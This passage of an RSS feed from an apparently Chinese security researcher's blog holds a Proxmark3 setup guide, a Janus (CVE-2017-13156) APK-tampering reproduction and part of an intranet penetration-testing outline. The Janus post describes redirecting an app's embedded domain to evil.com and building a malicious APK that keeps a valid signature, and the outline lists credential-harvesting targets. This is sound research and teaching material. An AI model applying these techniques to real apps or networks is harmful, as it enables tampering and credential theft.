      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;前段时间入手了proxmark3 rdv4，好像目前还是最新版本，不过听说马上又要有新版本了(2024更新：4.1早就出了，听说又有新版本了)，这次买的是官方标配加蓝牙拓展模块&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/048a3de0-c49a-45df-9084-ee5698a7ddbd.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4193f5e1-a708-4e06-84d5-05d8a9f2bdce.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/772761cc-d7e1-4c8b-98c1-feb7da22a43a.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看起来研制还阔以，迫不及待开始搭环境准备下手&lt;/p&gt;&#xA;&lt;p&gt;首先看到了官方文档的&lt;a href=&#34;https://github.com/Proxmark/proxmark3/wiki&#34;&gt;官方wiki&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;直接在kali上开搞，毕竟kali也是常用系统么&lt;/p&gt;&#xA;&lt;p&gt;根据官网指示首先输入如下命令安装相关依赖&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  sudo apt install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config libpcsclite-dev pcscd&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后再git clone下来以后开始编译，成功后如图所示：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3891243b-bdf7-44eb-bf79-a4d4da603350.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后将PM3连接到kali中，我的就是这样的，连到了虚拟机，希望不要出什么岔子，我可不希望几千块买的东西变砖&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b889a54c-576b-434a-b36e-e9b026b9f9db.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们继续跟着教程走，输入 &lt;code&gt;dmesg | grep -i usb&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;我的出现了一大串&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/059f8037-3ad5-4ca4-8b06-988588b1f960.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据提到的关键字检索后发现如下&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2bd156c3-65aa-4947-aef1-bf2a65755e7c.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时根据教程提示我们跳到下一步&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/15d98960-dc01-4642-9499-20961c702b55.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后通过以下命令进行固件升级操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2fba87d4-d506-4206-93e6-a105e80f1632.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候我们来执行命令看看PM3是否正常了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/ed2fa1cb-5b53-43dd-83f5-9369d26eea02.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;惊了，居然报错了，那问题是什么呢，报的是不正确的端口，通过之前的dmesg | grep -i usb命令再来看一下，原来端口变了&amp;hellip;以前在windows上玩盗版PM3也遇到过，插拔以后COM号会加1&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/6b0b0fd0-fa2f-47d5-a669-775aeeeb9d6d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那让我们重新输一次命令OK了！&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/39f1566d-9f68-44f5-a35d-08b649a8d27a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;完美！！！&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/36777762-34d2-438c-bd5a-5afcb7fb1bc1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;也就是说到此时我们kali Linux上的PM3环境已经完全配置完成了，之后就可以开始搞事情了哈哈哈哈&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/d4c54ef5-f81e-4380-980f-7b1ac44d8299.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功把自己差点变砖的PM3rdv4给救了回来，我TM真是个天才！！！&lt;/p&gt;&#xA;&lt;p&gt;让我们来看看读卡效果，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/8bc41e5a-5b1b-41fa-9750-88c0721c8102.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;读卡也读到了，简直完美！入门环境搭建教程就到这边，后续会根据实际情况写一些其他的教程。（其实这是一次救砖教程，之前因为一番神奇的操作导致我的PM3变砖，想想这400美刀买回来的东西就这么变砖了是真的难受！还好又在一番神器的操作下救了回来，果然电子产品出问题解决问题三部曲：重启重装重买）&lt;/p&gt;</description>
    </item>
    <item>
      <title>Janus漏洞复现</title>
      <link>https://yaphetszz.github.io/posts/janus%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Fri, 14 Sep 2018 04:32:27 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/janus%E6%BC%8F%E6%B4%9E/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Android平台被爆出“核弹级”漏洞Janus（CVE-2017-13156），该漏洞允许攻击者任意修改Android应用中的代码，而不会影响其签名。 众所周知，Android具有签名机制。正常情况下，开发者发布了一个应用，该应用一定需要开发者使用他的私钥对其进行签名。恶意攻击者如果尝试修改了这个应用中的任何一个文件（包括代码和资源等），那么他就必须对APK进行重新签名，否则修改过的应用是无法安装到任何Android设备上的。但如果恶意攻击者用另一把私钥对APK签了名，并将这个修改过的APK对用户手机里的已有应用升级时，就会出现签名不一致的情况。因此，在正常情况下，Android的签名机制起到了防篡改的作用。&lt;/p&gt;&#xA;&lt;p&gt;但如果恶意攻击者利用Janus漏洞，那么恶意攻击者就可以任意地修改一个APK中的代码（包括系统的内置应用），同时却不需要对APK进行重新签名。换句话说，用这种方式修改过的APK，Android系统会认为它的签名和官方的签名是一致的，但在这个APK运行时，执行的却是恶意攻击者的代码。恶意攻击者利用这个修改过的APK，就可以用来覆盖安装原官方应用（包括系统的内置应用）。由此可见，该漏洞危害极大，而且影响的不仅是手机，而是所有使用Android操作系统的设备。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b85e2cb5-e399-4d24-b35b-13fc0d299c73.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要问题是没有使用V2签名&#xA;使用getapkinfo查看应用信息，未使用V2签名&#xA;&lt;img src=&#34;../index_files/617873ce-0216-4a53-a57c-65a1019a7fad.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;为了避免误报问题，解压安装包后查看签名.SF文件，可以看到没有加V2签名&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/47d5e25b-76e4-4167-ab4c-6832cc37a74e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用一款已经添加了V2签名的APP来查看可以看到X-Android-APK-Signed: 2字段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/5d285604-ed4d-4835-bd9c-506a652e467a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;提取出文件中的dex，并进行反编译，此处采用baksmali&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;java -jar baksmali-2.5.2.jar d classes.dex&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/64a1631e-e126-4d69-8c50-de2063bb64d4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入默认输出文件夹，可以看到已经反编译出了smali文件&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/f86e352b-587d-4aea-aa5f-a84eca1a572b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用命令&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find . -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\*.smali&amp;#34;&lt;/span&gt; | xargs grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;const&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/df8d5baf-b406-4331-ae5f-cb871f725977.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到在Utils.smali文件中大量信息&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/274ca1c7-2a8e-45a4-87b8-2f900490a26d.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;选择其中的域名信息，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/26ce6960-e553-412e-8946-b14ddd2c1f93.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;修改为evil.com&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/cf2a01e2-95ae-4b6b-9931-e36936365dbd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;修改后保存，重打包成为新的dex，重新生成的文件为out.dex&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/cbffbcf5-4418-450c-b27c-88f79edee3ab.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用利用工具生成恶意的APK包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/28fcce24-8a3a-4d75-bbc7-e1ca1e9c7cd0.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过工具对比可见两个文件的签名文件校验结果完全一致&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/7d3df106-ed8c-4f40-b137-0a708b2a9aec.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>内网渗透备忘录</title>
      <link>https://yaphetszz.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
      <pubDate>Sun, 12 Aug 2018 03:44:31 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&#xA;本来是个xmind脑图，用于内网渗透的时候提供备忘思路，从xmind转换为md格式，可点击&lt;a href=&#34;https://yaphetszz.github.io/atta&#34;&gt;附件菜单&lt;/a&gt;获取xmind文件&lt;/p&gt;&#xA;&lt;h1 id=&#34;内网渗透&#34;&gt;内网渗透&lt;/h1&gt;&#xA;&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;&#xA;&lt;h3 id=&#34;大型内网域环境&#34;&gt;大型内网域环境&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;父域控制器&lt;/li&gt;&#xA;&lt;li&gt;子域控制器&lt;/li&gt;&#xA;&lt;li&gt;辅域控制器&lt;/li&gt;&#xA;&lt;li&gt;域内主机&lt;/li&gt;&#xA;&lt;li&gt;域内服务器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;windows-ntlm认证原理&#34;&gt;Windows NTLM认证原理&lt;/h3&gt;&#xA;&lt;h3 id=&#34;kerberos域内认证原理&#34;&gt;Kerberos域内认证原理&lt;/h3&gt;&#xA;&lt;h2 id=&#34;内网信息收集&#34;&gt;内网信息收集&lt;/h2&gt;&#xA;&lt;h3 id=&#34;工作组和大型内网信息收集基础&#34;&gt;工作组和大型内网信息收集基础&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;本机密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Windows2012高版本收集&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Windows2012以下低版本收集&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Linux下密码收集&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;收集特定密码文件&lt;/li&gt;&#xA;&lt;li&gt;指定用户命令历史记录明文密码&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;无线密码获取&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;注册表敏感键值信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据库中的密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mysql&lt;/li&gt;&#xA;&lt;li&gt;SQL Server&lt;/li&gt;&#xA;&lt;li&gt;&amp;hellip;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;本地储存的密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;本地密码本&lt;/li&gt;&#xA;&lt;li&gt;Windows常用软件密码&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;浏览器信息&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Chrome&lt;/li&gt;&#xA;&lt;li&gt;Firefox&lt;/li&gt;&#xA;&lt;li&gt;360&lt;/li&gt;&#xA;&lt;li&gt;IE&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;VPN和代理&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;VPN&lt;/li&gt;&#xA;&lt;li&gt;代理服务器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据库信息&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Mysql&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;SQL Server&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Oracle&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;PostgreSQL&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;LDAP&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;通过LDAP定位核心机器&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取内网架构分布&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取内网组织架构&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取域内核心机器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;判断协议出网&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;获取详细网络配置&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hosts&lt;/li&gt;&#xA;&lt;li&gt;所在域&lt;/li&gt;&#xA;&lt;li&gt;IP&lt;/li&gt;&#xA;&lt;li&gt;掩码&lt;/li&gt;&#xA;&lt;li&gt;网关&lt;/li&gt;&#xA;&lt;li&gt;主备DNS ip&lt;/li&gt;&#xA;&lt;li&gt;IPC连接情况&lt;/li&gt;&#xA;&lt;li&gt;共享目录&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户登录记录&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户命令记录&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;屏幕抓取敏感信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;环境变量信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;远程控制服务情况&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;RDP&lt;/li&gt;&#xA;&lt;li&gt;SSH&lt;/li&gt;&#xA;&lt;li&gt;VNC&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;安装的软件列表&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://yaphetszz.github.io/links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://yaphetszz.github.io/links/</guid>
      <description>&lt;h1 id=&#34;友链&#34;&gt;友链&lt;/h1&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.ol4three.com/&#34;&gt;ol4three&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;友链旺铺招租有需要联系我&#34;&gt;友链旺铺招租，有需要联系我&lt;/h1&gt;</description>
    </item>
    <item>
      <title>About Me</title>
      <link>https://yaphetszz.github.io/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://yaphetszz.github.io/about/</guid>
      <description>&lt;h1 id=&#34;y4ph3ts&#34;&gt;Y4ph3tS&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;安全研究员（FSRT学习中）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h1 id=&#34;部分专业认证&#34;&gt;部分专业认证&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;🔒 Security+  /  ISO27001  /  CISP  /  商用密码测评&lt;/li&gt;&#xA;&lt;li&gt;🔫 IDPA SO&lt;/li&gt;&#xA;&lt;li&gt;📻️ HAM（BI1UCN）&lt;/li&gt;&#xA;&lt;li&gt;🩹️ TECC  /  WAFA  /  TCMT  /  AHA&lt;/li&gt;&#xA;&lt;li&gt;🤿️ AOW  /  OW&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h1 id=&#34;计划中认证&#34;&gt;计划中认证&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;🔐 CISSP    /    Offsec系列    /    CISA    /    CDPSE&lt;/li&gt;&#xA;&lt;li&gt;🆘 WFR    /    TCCC    /    EFR / SRT&lt;/li&gt;&#xA;&lt;li&gt;🛩️ SPL    /    AOPA    /    CAAC&lt;/li&gt;&#xA;&lt;li&gt;🏔️ 国家应急救援员 / 山地户外指导员&lt;/li&gt;&#xA;&lt;li&gt;🪂 USPA&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;稍微懂一点编程语言&#34;&gt;稍微懂一点编程语言&lt;/h2&gt;&#xA;&lt;p&gt;Python、Go、PHP、JAVA、C++、汇编、Ruby、nim&amp;hellip;&lt;/p&gt;&#xA;&lt;h2 id=&#34;主要研究方向&#34;&gt;主要研究方向&lt;/h2&gt;&#xA;&lt;p&gt;攻防、商用密码、红队武器开发&lt;/p&gt;&#xA;&lt;h2 id=&#34;技术栈&#34;&gt;技术栈&lt;/h2&gt;&#xA;&lt;p&gt;WEB、内网、代码审计（JAVA、PHP）、免杀、近源渗透、社会工程学、安卓、应急响应、溯源&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;会一点WEB、会一点内网、会一点安卓、会一点密码学、会一点IoT、会一点车联网、会一点逆向，偶尔打打CTF&amp;hellip;&lt;/p&gt;&#xA;&lt;h2 id=&#34;others&#34;&gt;Others&lt;/h2&gt;&#xA;&lt;p&gt;🪖战术、户外装备优惠渠道（通用装甲、爱默生、龙牙、耐特科尔、纳丽德、塔虎、莱泽曼、拾月战术），欢迎咨询&lt;/p&gt;&#xA;&lt;h2 id=&#34;联系方式&#34;&gt;联系方式&lt;/h2&gt;&#xA;&lt;p&gt;公众号后台，找找群友，找找朋友，就能联系到我了（狗头）&lt;/p&gt;&#xA;&lt;h2 id=&#34;微信公众号年更选手&#34;&gt;微信公众号(年更选手)&lt;/h2&gt;&#xA;&lt;p&gt;魔影安全实验室&lt;/p&gt;</description>
    </item>
    <item>
      <title>附件列表</title>
      <link>https://yaphetszz.github.io/atta/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://yaphetszz.github.io/atta/</guid>
      <description>&lt;h3 id=&#34;本目录下列出了文章中可能包含的一些附件直接点击链接下载&#34;&gt;本目录下列出了文章中可能包含的一些附件，直接点击链接下载。&lt;/h3&gt;&#xA;&lt;ul&gt;&#xD;&#xA;    &#xD;&#xA;    &#xD;&#xA;        &#xD;&#xA;    &#xD;&#xA;         &#xD;&#xA;            &lt;li&gt;&#xD;&#xA;                &lt;a href=&#34;https://yaphetszz.github.io/atta/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f.xmind&#34; download&gt;内网渗透.xmind&lt;/a&gt; &#xD;&#xA;            &lt;/li&gt;&#xD;&#xA;        &#xD;&#xA;    &#xD;&#xA;    &lt;/ul&gt;</description>
    </item>
  </channel>
</rss>
